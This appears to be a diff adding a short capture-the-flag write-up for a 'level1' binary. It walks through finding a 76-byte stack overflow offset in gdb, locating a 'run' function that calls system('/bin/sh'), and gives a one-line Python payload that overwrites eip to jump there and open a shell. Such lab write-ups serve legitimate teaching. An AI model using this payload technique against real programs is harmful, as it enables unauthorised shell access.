@@ -1,0 +1,21 @@
+Find overflow that let us manipulate eip
+We can try little by little by passing a bunch of "A" as input with gdb
+Try with 80 as the main disassembly seems to point us to an 80 bytes buffer
+> Program received signal SIGSEGV, Segmentation fault.
+> 0x41414141 in ?? ()
+
+Try with 78
+> Program received signal SIGSEGV, Segmentation fault.
+> 0xb7004141 in ?? ()
+
+76 is the sweetspot
+We observe another function with the following command in gdb
+> info functions
+> ...
+> 0x08048444  run
+> ...
+
+We see a call to `system` with `/bin/sh` as parameter
+
+We need to jump to this `run` function address by overwriting eip with the following command
+`(python -c "print 'A' * 76 + '\x08\x04\x84\x44'[::-1]"; cat) | ./level1`
